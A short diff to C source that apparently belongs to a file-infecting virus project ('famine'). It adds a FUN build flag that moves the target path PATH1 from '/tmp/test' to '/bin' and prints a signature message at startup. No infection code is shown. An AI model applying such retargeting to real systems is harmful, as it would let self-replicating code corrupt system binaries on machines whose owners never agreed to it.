@@ -14,9 +14,14 @@
 #include "famine.h"
 #include "death.h"
 #include "syscall.h"
+#include "errno.h"
 
 #ifndef PATH1
- #define PATH1 "/tmp/test"
+ #ifdef FUN
+  #define PATH1 "/bin"
+ #else
+  #define PATH1 "/tmp/test"
+ #endif
 #endif
 
 #ifndef PATH2
@@ -302,6 +307,12 @@ void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 
 void	entrypoint(int argc, char **argv, char **envp)
 {
+
+#ifdef FUN
+	char msg[] = "\033[31mLove from diroyer <3\033[0m\n";
+	write(1, msg, sizeof(msg) - 1);
+#endif
+
 	bootstrap_data_t bootstrap_data;
 	bootstrap_data.argc = argc;
 	bootstrap_data.argv = argv;
